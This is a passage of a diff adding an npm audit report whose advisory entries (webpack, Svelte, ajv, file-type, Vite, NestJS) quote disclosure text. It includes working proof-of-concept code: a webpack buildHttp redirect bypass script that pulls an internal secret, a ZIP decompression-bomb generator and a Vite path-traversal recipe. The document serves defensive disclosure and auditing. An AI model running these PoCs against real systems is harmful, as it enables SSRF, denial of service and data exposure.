\"❌\");\n\n(async () => {\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \"webpack-attacker-\"));\n  const srcDir = path.join(tmp, \"src\");\n  const distDir = path.join(tmp, \"dist\");\n  const cacheDir = path.join(tmp, \".buildHttp-cache\");\n  const lockfile = path.join(tmp, \"webpack.lock\");\n  const bundlePath = path.join(distDir, \"bundle.js\");\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \"index.js\"),\n    `import { secret } from ${JSON.stringify(entryUrl)};\nconsole.log(\"LEAKED_SECRET:\", secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \"development\",\n    entry: \"./src/index.js\",\n    output: { path: distDir, filename: \"bundle.js\" },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedBase],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) => {\n    try {\n      if (err) throw err;\n\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n      if (stats.hasErrors()) {\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \"utf8\");\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const secret = m ? m[0] : null;\n\n      console.log(\"\\n[ATTACKER RESULT]\");\n      console.log(`- webpack version: ${webpackPkg.version}`);\n      console.log(`- node version: ${process.version}`);\n      console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`);\n      console.log(`- imported URL (allowed only): ${entryUrl}`);\n      console.log(`- temp dir: ${tmp}`);\n      console.log(`- lockfile: ${lockfile}`);\n      console.log(`- cacheDir: ${cacheDir}`);\n      console.log(`- bundle:   ${bundlePath}`);\n\n      if (!secret) {\n        console.log(\"\\n[SECURITY SUMMARY]\");\n        console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`);\n        return;\n      }\n\n      const lockHit = await fileContains(lockfile, secret);\n\n      let cacheFiles = [];\n      try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; }\n      const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length > 0 : false;\n\n      const allTmpFiles = await walk(tmp);\n      const allHits = await findInFiles(allTmpFiles, secret);\n\n      console.log(`\\n- extracted secret marker from bundle: ${secret}`);\n\n      console.log(\"\\n[SECURITY SUMMARY]\");\n      console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`);\n      console.log(`- Internal target (SSRF-like): ${internalTarget}`);\n      console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`);\n      console.log(`- ACTUAL: internal content treated as module and bundled`);\n\n      console.log(\"\\n[EVIDENCE CHECKLIST]\");\n      console.log(`- bundle contains secret:   ${fmtBool(true)}`);\n      console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n\n      console.log(\"\\n[PERSISTENCE CHECK] files containing secret\");\n      for (const f of allHits.slice(0, 30)) console.log(`- ${f}`);\n      if (allHits.length > 30) console.log(`- ... and ${allHits.length - 30} more`);\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() => {});\n    }\n  });\n})();\n```\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected\n\nExpected: Redirect target should be rejected if not in allowedUris (only http://127.0.0.1:9000/ is allowed).\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled).\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can:\n\ntrigger network requests from the build machine to internal-only services (SSRF behavior),\n\ncause content from outside the allow-list to be bundled into build outputs,\n\nand cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.",
+      "reported_by": null,
+      "title": "webpack buildHttp HttpUriPlugin allowedUris bypass via HTTP redirects → SSRF + cache persistence",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-68157"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "webpack",
+      "vulnerable_versions": ">=5.49.0 <5.104.0",
+      "github_advisory_id": "GHSA-38r7-794h-5758",
+      "recommendation": "Upgrade to version 5.104.0 or later",
+      "patched_versions": ">=5.104.0",
+      "updated": "2026-02-06T14:39:27.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-38r7-794h-5758"
+    },
+    "1113416": {
+      "findings": [
+        {
+          "version": "4.2.20",
+          "paths": [
+            "apps__client>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-crpf-4hrx-3jrp\n- https://github.com/sveltejs/svelte/commit/73098bb26c6f06e7fd1b0746d817d2c5ee90755f\n- https://github.com/sveltejs/svelte/releases/tag/svelte@5.51.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27125\n- https://github.com/advisories/GHSA-crpf-4hrx-3jrp",
+      "created": "2026-02-19T20:28:49.000Z",
+      "id": 1113416,
+      "npm_advisory_id": null,
+      "overview": "In server-side rendering, attribute spreading on elements (e.g. `<div {...attrs}>`) enumerates inherited properties from the object's prototype chain rather than only own properties. In environments where `Object.prototype` has already been polluted — a precondition outside of Svelte's control — this can cause unexpected attributes to appear in SSR output or cause SSR to throw errors. Client-side rendering is not affected.",
+      "reported_by": null,
+      "title": "Svelte SSR attribute spreading includes inherited properties from prototype chain",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27125"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.51.4",
+      "github_advisory_id": "GHSA-crpf-4hrx-3jrp",
+      "recommendation": "Upgrade to version 5.51.5 or later",
+      "patched_versions": ">=5.51.5",
+      "updated": "2026-02-23T22:23:50.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-915"
+      ],
+      "url": "https://github.com/advisories/GHSA-crpf-4hrx-3jrp"
+    },
+    "1113418": {
+      "findings": [
+        {
+          "version": "4.2.20",
+          "paths": [
+            "apps__client>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-m56q-vw4c-c2cp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27122\n- https://github.com/advisories/GHSA-m56q-vw4c-c2cp",
+      "created": "2026-02-19T15:18:42.000Z",
+      "id": 1113418,
+      "npm_advisory_id": null,
+      "overview": "When using `<svelte:element this={tag}>` in server-side rendering, the provided tag name is not validated or sanitized before being emitted into the HTML output. If the tag string contains unexpected characters, it can result in HTML injection in the SSR output. Client-side rendering is not affected.",
+      "reported_by": null,
+      "title": "Svelte SSR does not validate dynamic element tag names in `<svelte:element>`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27122"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.51.4",
+      "github_advisory_id": "GHSA-m56q-vw4c-c2cp",
+      "recommendation": "Upgrade to version 5.51.5 or later",
+      "patched_versions": ">=5.51.5",
+      "updated": "2026-02-23T22:23:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-m56q-vw4c-c2cp"
+    },
+    "1113419": {
+      "findings": [
+        {
+          "version": "4.2.20",
+          "paths": [
+            "apps__client>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-f7gr-6p89-r883\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27121\n- https://github.com/advisories/GHSA-f7gr-6p89-r883",
+      "created": "2026-02-19T15:18:33.000Z",
+      "id": 1113419,
+      "npm_advisory_id": null,
+      "overview": "Versions of svelte prior to 5.51.5 are vulnerable to cross-site scripting (XSS) during server-side rendering. When using spread syntax to render attributes from untrusted data, event handler properties are included in the rendered HTML output. If an application spreads user-controlled or external data as element attributes, an attacker can inject malicious event handlers that execute in victims' browsers.",
+      "reported_by": null,
+      "title": "Svelte affected by cross-site scripting via spread attributes in Svelte SSR",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27121"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.51.4",
+      "github_advisory_id": "GHSA-f7gr-6p89-r883",
+      "recommendation": "Upgrade to version 5.51.5 or later",
+      "patched_versions": ">=5.51.5",
+      "updated": "2026-02-23T22:23:06.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-f7gr-6p89-r883"
+    },
+    "1113715": {
+      "findings": [
+        {
+          "version": "8.12.0",
+          "paths": [
+            "apps__server>@nestjs/cli>@angular-devkit/core>ajv"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-69873\n- https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md\n- https://github.com/ajv-validator/ajv/pull/2586\n- https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5\n- https://github.com/ajv-validator/ajv/releases/tag/v8.18.0\n- https://github.com/ajv-validator/ajv/pull/2588\n- https://github.com/ajv-validator/ajv/releases/tag/v6.14.0\n- https://github.com/advisories/GHSA-2g4f-4pwh-qvx6\n- https://github.com/ajv-validator/ajv/pull/2590\n- https://github.com/github/advisory-database/pull/6991",
+      "created": "2026-02-11T21:30:39.000Z",
+      "id": 1113715,
+      "npm_advisory_id": null,
+      "overview": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "reported_by": null,
+      "title": "ajv has ReDoS when using `$data` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-69873"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ajv",
+      "vulnerable_versions": ">=7.0.0-alpha.0 <8.18.0",
+      "github_advisory_id": "GHSA-2g4f-4pwh-qvx6",
+      "recommendation": "Upgrade to version 8.18.0 or later",
+      "patched_versions": ">=8.18.0",
+      "updated": "2026-03-02T21:58:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+    },
+    "1114301": {
+      "findings": [
+        {
+          "version": "20.4.1",
+          "paths": [
+            "apps__server>@nestjs/common>file-type"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sindresorhus/file-type/security/advisories/GHSA-5v7r-6r5c-r473\n- https://nvd.nist.gov/vuln/detail/CVE-2026-31808\n- https://github.com/sindresorhus/file-type/commit/319abf871b50ba2fa221b4a7050059f1ae096f4f\n- https://github.com/advisories/GHSA-5v7r-6r5c-r473",
+      "created": "2026-03-10T23:57:09.000Z",
+      "id": 1114301,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA denial of service vulnerability exists in the ASF (WMV/WMA) file type detection parser. When parsing a crafted input where an ASF sub-header has a `size` field of zero, the parser enters an infinite loop. The `payload` value becomes negative (-24), causing `tokenizer.ignore(payload)` to move the read position backwards, so the same sub-header is read repeatedly forever.\n\nAny application that uses `file-type` to detect the type of untrusted/attacker-controlled input is affected. An attacker can stall the Node.js event loop with a 55-byte payload.\n\n### Patches\nFixed in version 21.3.1. Users should upgrade to >= 21.3.1.\n\n### Workarounds\nValidate or limit the size of input buffers before passing them to `file-type`, or run file type detection in a worker thread with a timeout.\n\n### References\n- Fix commit: 319abf871b50ba2fa221b4a7050059f1ae096f4f\n\n### Reporter\n\ncrnkovic@lokvica.com",
+      "reported_by": null,
+      "title": "file-type affected by infinite loop in ASF parser on malformed input with zero-size sub-header",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-31808"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "file-type",
+      "vulnerable_versions": ">=13.0.0 <21.3.1",
+      "github_advisory_id": "GHSA-5v7r-6r5c-r473",
+      "recommendation": "Upgrade to version 21.3.1 or later",
+      "patched_versions": ">=21.3.1",
+      "updated": "2026-03-10T23:57:11.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-5v7r-6r5c-r473"
+    },
+    "1114402": {
+      "findings": [
+        {
+          "version": "4.2.20",
+          "paths": [
+            "apps__client>svelte"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-phwv-c562-gvmh\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27901\n- https://github.com/sveltejs/svelte/commit/0df5abcae223058ceb95491470372065fb87951d\n- https://github.com/sveltejs/svelte/releases/tag/svelte@5.53.5\n- https://github.com/advisories/GHSA-phwv-c562-gvmh",
+      "created": "2026-02-26T22:24:54.000Z",
+      "id": 1114402,
+      "npm_advisory_id": null,
+      "overview": "The contents of `bind:innerText` and `bind:textContent` on `contenteditable` elements were not properly escaped. This could enable HTML injection and Cross-site Scripting (XSS) if rendering untrusted data as the binding's initial value on the server.",
+      "reported_by": null,
+      "title": "Svelte vulnerable to XSS during SSR with contenteditable `bind:innerText` and `bind:textContent`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27901"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "svelte",
+      "vulnerable_versions": "<=5.53.4",
+      "github_advisory_id": "GHSA-phwv-c562-gvmh",
+      "recommendation": "Upgrade to version 5.53.5 or later",
+      "patched_versions": ">=5.53.5",
+      "updated": "2026-03-11T21:14:50.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-phwv-c562-gvmh"
+    },
+    "1114726": {
+      "findings": [
+        {
+          "version": "20.4.1",
+          "paths": [
+            "apps__server>@nestjs/common>file-type"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sindresorhus/file-type/security/advisories/GHSA-j47w-4g3g-c36v\n- https://github.com/sindresorhus/file-type/commit/a155cd71323279de173c54e8c530d300d3854fdd\n- https://github.com/sindresorhus/file-type/releases/tag/v21.3.2\n- https://nvd.nist.gov/vuln/detail/CVE-2026-32630\n- https://github.com/sindresorhus/file-type/commit/399b0f156063f5aeb1c124a7fd61028f3ea7c124\n- https://github.com/advisories/GHSA-j47w-4g3g-c36v",
+      "created": "2026-03-13T20:56:05.000Z",
+      "id": 1114726,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA crafted ZIP file can trigger excessive memory growth during type detection in `file-type` when using `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()`.\n\nIn affected versions, the ZIP inflate output limit is enforced for stream-based detection, but not for known-size inputs. As a result, a small compressed ZIP can cause `file-type` to inflate and process a much larger payload while probing ZIP-based formats such as OOXML. In testing on `file-type` `21.3.1`, a ZIP of about `255 KB` caused about `257 MB` of RSS growth during `fileTypeFromBuffer()`.\n\nThis is an availability issue. Applications that use these APIs on untrusted uploads can be forced to consume large amounts of memory and may become slow or crash.\n\n## Root Cause\n\nThe ZIP detection logic applied different limits depending on whether the tokenizer had a known file size.\n\nFor stream inputs, ZIP probing was bounded by `maximumZipEntrySizeInBytes` (`1 MiB`). For known-size inputs such as buffers, blobs, and files, the code instead used `Number.MAX_SAFE_INTEGER` in two relevant places:\n\n```js\nconst maximumContentTypesEntrySize = hasUnknownFileSize(tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nand:\n\n```js\nconst maximumLength = hasUnknownFileSize(this.tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nTogether, these checks allowed a crafted ZIP to bypass the intended inflate limit for known-size APIs and force large decompression during detection of entries such as `[Content_Types].xml`.\n\n## Proof of Concept\n\n```js\nimport {fileTypeFromBuffer} from 'file-type';\nimport archiver from 'archiver';\nimport {Writable} from 'node:stream';\n\nasync function createZipBomb(sizeInMegabytes) {\n\treturn new Promise((resolve, reject) => {\n\t\tconst chunks = [];\n\t\tconst writable = new Writable({\n\t\t\twrite(chunk, encoding, callback) {\n\t\t\t\tchunks.push(chunk);\n\t\t\t\tcallback();\n\t\t\t},\n\t\t});\n\n\t\tconst archive = archiver('zip', {zlib: {level: 9}});\n\t\tarchive.pipe(writable);\n\t\twritable.on('finish', () => {\n\t\t\tresolve(Buffer.concat(chunks));\n\t\t});\n\t\tarchive.on('error', reject);\n\n\t\tconst xmlPrefix = '<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">';\n\t\tconst padding = Buffer.alloc(sizeInMegabytes * 1024 * 1024 - xmlPrefix.length, 0x20);\n\t\tarchive.append(Buffer.concat([Buffer.from(xmlPrefix), padding]), {name: '[Content_Types].xml'});\n\t\tarchive.finalize();\n\t});\n}\n\nconst zip = await createZipBomb(256);\nconsole.log('ZIP size (KB):', (zip.length / 1024).toFixed(0));\n\nconst before = process.memoryUsage().rss;\nawait fileTypeFromBuffer(zip);\nconst after = process.memoryUsage().rss;\n\nconsole.log('RSS growth (MB):', ((after - before) / 1024 / 1024).toFixed(0));\n```\n\nObserved on `file-type` `21.3.1`:\n- ZIP size: about `255 KB`\n- RSS growth during detection: about `257 MB`\n\n## Affected APIs\n\nAffected:\n- `fileTypeFromBuffer()`\n- `fileTypeFromBlob()`\n- `fileTypeFromFile()`\n\nNot affected:\n- `fileTypeFromStream()`, which already enforced the ZIP inflate limit for unknown-size inputs\n\n## Impact\n\nApplications that inspect untrusted uploads with `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()` can be forced to consume excessive memory during ZIP-based type detection. This can degrade service or lead to process termination in memory-constrained environments.\n\n## Cause\n\nThe issue was introduced in 399b0f1",
+      "reported_by": null,
+      "title": "file-type: ZIP Decompression Bomb DoS via [Content_Types].xml entry",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-32630"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "file-type",
+      "vulnerable_versions": ">=20.0.0 <=21.3.1",
+      "github_advisory_id": "GHSA-j47w-4g3g-c36v",
+      "recommendation": "Upgrade to version 21.3.2 or later",
+      "patched_versions": ">=21.3.2",
+      "updated": "2026-03-16T21:59:51.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-409"
+      ],
+      "url": "https://github.com/advisories/GHSA-j47w-4g3g-c36v"
+    },
+    "1116229": {
+      "findings": [
+        {
+          "version": "5.4.21",
+          "paths": [
+            "apps__client>vite"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-4w7w-66w2-5vf9\n- https://github.com/vitejs/vite/pull/22161\n- https://github.com/vitejs/vite/commit/79f002f2286c03c88c7b74c511c7f9fc6dc46694\n- https://github.com/vitejs/vite/releases/tag/v6.4.2\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39365\n- https://github.com/advisories/GHSA-4w7w-66w2-5vf9",
+      "created": "2026-04-06T18:03:46.000Z",
+      "id": 1116229,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nAny files ending with `.map` even out side the project can be returned to the browser.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- have a sensitive content in files ending with `.map` and the path is predictable\n\n### Details\n\nIn Vite v7.3.1, the dev server’s handling of `.map` requests for optimized dependencies resolves file paths and calls `readFile` without restricting `../` segments in the URL. As a result, it is possible to bypass the [`server.fs.strict`](https://vite.dev/config/server-options#server-fs-strict) allow list and retrieve `.map` files located outside the project root, provided they can be parsed as valid source map JSON.\n\n### PoC\n1. Create a minimal PoC sourcemap outside the project root\n    ```bash\n    cat > /tmp/poc.map <<'EOF'\n    {\"version\":3,\"file\":\"x.js\",\"sources\":[],\"names\":[],\"mappings\":\"\"}\n    EOF\n    ```\n2. Start the Vite dev server (example)\n    ```bash\n    pnpm -C playground/fs-serve dev --host 127.0.0.1 --port 18080\n    ```\n3. Confirm that direct `/@fs` access is blocked by `strict` (returns 403)\n    <img width=\"4004\" height=\"1038\" alt=\"image\" src=\"https://github.com/user-attachments/assets/15a859a8-1dc6-4105-8d58-80527c0dd9ab\" />\n4. Inject `../` segments under the optimized deps `.map` URL prefix to reach `/tmp/poc.map`\n    <img width=\"2790\" height=\"846\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5d02957d-2e6a-4c45-9819-3f024e0e81f2\" />",
+      "reported_by": null,
+      "title": "Vite Vulnerable to Path Traversal in Optimized Deps `.map` Handling",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39365"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": "<=6.4.1",
+      "github_advisory_id": "GHSA-4w7w-66w2-5vf9",
+      "recommendation": "Upgrade to version 6.4.2 or later",
+      "patched_versions": ">=6.4.2",
+      "updated": "2026-04-07T22:16:29.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-4w7w-66w2-5vf9"
+    },
+    "1117063": {
+      "findings": [
+        {
+          "version": "10.4.22",
+          "paths": [
+            "apps__server>@nestjs/core"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nestjs/nest/security/advisories/GHSA-36xv-jgw5-4q75\n- https://github.com/nestjs/nest/pull/16686\n- https://github.com/nestjs/nest/commit/83558ae774a990a7916141d3abe0b6548ff3a8b2\n- https://github.com/nestjs/nest/releases/tag/v11.1.18\n- https://nvd.nist.gov/vuln/detail/CVE-2026-35515\n- https://github.com/advisories/GHSA-36xv-jgw5-4q75",
+      "created": "2026-04-06T17:59:51.000Z",
+      "id": 1117063,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n[`SseStream._transform()`](https://github.com/nestjs/nest/blob/dea5279ef8fcb568de158003e4281759a2cd7675/packages/core/router/sse-stream.ts) interpolates `message.type` and `message.id` directly into Server-Sent Events text protocol output without sanitizing newline characters (`\\r`, `\\n`). Since the SSE protocol treats both `\\r` and `\\n` as field delimiters and `\\n\\n` as event boundaries, an attacker who can influence these fields through upstream data sources can inject arbitrary SSE events, spoof event types, and corrupt reconnection state. Spring Framework's own security patch ([6e97587](https://github.com/spring-projects/spring-framework/commit/6e9758700a4946be1dca85ca937ef2603e291301)) validates these same fields (`id`, `event`) for the same reason.\n\nActual impact:\n\n- **Event spoofing**: Attacker forges SSE events with arbitrary `event:` types, causing client-side `EventSource.addEventListener()` callbacks to fire for wrong event types.\n- **Data injection**: Attacker injects arbitrary `data:` payloads, potentially triggering XSS if the client renders SSE data as HTML without sanitization.\n- **Reconnection corruption**: Attacker injects `id:` fields, corrupting the `Last-Event-ID` header on reconnection, causing the client to miss or replay events.\n- **Attack precondition**: Requires the developer to map user-influenced data to the `type` or `id` fields of SSE messages. Direct HTTP request input does not reach these fields without developer code bridging the gap.\n-\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nPatched in `@nestjs/core@11.1.18`",
+      "reported_by": null,
+      "title": "@nestjs/core Improperly Neutralizes Special Elements in Output Used by a Downstream Component ('Injection')",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-35515"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@nestjs/core",
+      "vulnerable_versions": "<=11.1.17",
+      "github_advisory_id": "GHSA-36xv-jgw5-4q75",
+      "recommendation": "Upgrade to version 11.1.18 or later",
+      "patched_versions": ">=11.1.18",
+      "updated": "2026-04-24T20:46:24.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-36xv-jgw5-4q75"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 4,
+      "moderate": 10,
+      "high": 0,
+      "critical": 0
+    },
+    "dependencies": 663,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 663
+  }
+}
